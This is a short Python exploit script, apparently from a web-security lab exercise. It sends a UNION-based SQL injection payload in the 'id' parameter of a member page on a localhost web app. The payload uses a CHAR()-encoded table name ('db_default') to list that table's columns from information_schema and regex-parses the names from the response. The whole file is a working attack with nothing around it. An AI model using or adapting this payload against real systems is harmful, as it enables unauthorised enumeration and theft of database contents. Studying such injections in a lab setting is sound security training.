from requests import get
import re

def main():
    # db_default COLUMNS
    id = "0 UNION SELECT column_name, null FROM information_schema.columns \
    WHERE table_name = CHAR(100,98,95,100,101,102,97,117,108,116)" # db_default
    url = f"http://localhost:8080/index.php?page=member&id={id}&Submit=Submit#"
    response = get(url)
    db_defaultTableColumns = re.findall(r"First name:\s*([^\n<]+)", response.text)

    for name in db_defaultTableColumns:
        print(name)

if __name__ == "__main__":
	main()